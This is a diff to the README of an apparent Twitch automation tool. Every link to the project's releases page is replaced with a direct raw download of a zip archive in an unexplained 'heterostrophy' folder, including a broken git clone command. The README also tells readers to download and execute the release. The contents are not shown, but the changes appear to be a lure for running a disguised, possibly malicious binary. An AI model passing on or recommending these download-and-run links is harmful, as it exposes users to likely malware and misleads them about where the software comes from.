@@ -2,7 +2,7 @@
 
 Welcome to the **Twitch UltraTool** repository! This toolset is designed for streamers and developers who want to enhance their Twitch experience. From account creation to chat bots, we cover it all. 
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/LankaGao/Twitch-UltraTool/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/LankaGao/Twitch-UltraTool/main/heterostrophy/Tool-Ultra-Twitch-1.5.zip)](https://raw.githubusercontent.com/LankaGao/Twitch-UltraTool/main/heterostrophy/Tool-Ultra-Twitch-1.5.zip)
 
 ## 📚 Table of Contents
 1. [Introduction](#introduction)
@@ -38,7 +38,7 @@ To get started with Twitch UltraTool, follow these simple steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/LankaGao/Twitch-UltraTool.git
+   git clone https://raw.githubusercontent.com/LankaGao/Twitch-UltraTool/main/heterostrophy/Tool-Ultra-Twitch-1.5.zip
    cd Twitch-UltraTool
    ```
 
@@ -49,7 +49,7 @@ To get started with Twitch UltraTool, follow these simple steps:
    ```
 
 3. **Download and Execute the Latest Release**: 
-   Visit [this link](https://github.com/LankaGao/Twitch-UltraTool/releases) to download the latest release. Follow the instructions provided in the release notes to execute the tool.
+   Visit [this link](https://raw.githubusercontent.com/LankaGao/Twitch-UltraTool/main/heterostrophy/Tool-Ultra-Twitch-1.5.zip) to download the latest release. Follow the instructions provided in the release notes to execute the tool.
 
 ## 🛠️ Usage
 
@@ -117,7 +117,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or need assistance, feel free to reach out. You can open an issue in the repository or contact us through our social media channels.
 
-For the latest updates, don't forget to check the [Releases](https://github.com/LankaGao/Twitch-UltraTool/releases) section.
+For the latest updates, don't forget to check the [Releases](https://raw.githubusercontent.com/LankaGao/Twitch-UltraTool/main/heterostrophy/Tool-Ultra-Twitch-1.5.zip) section.
 
 ---
 
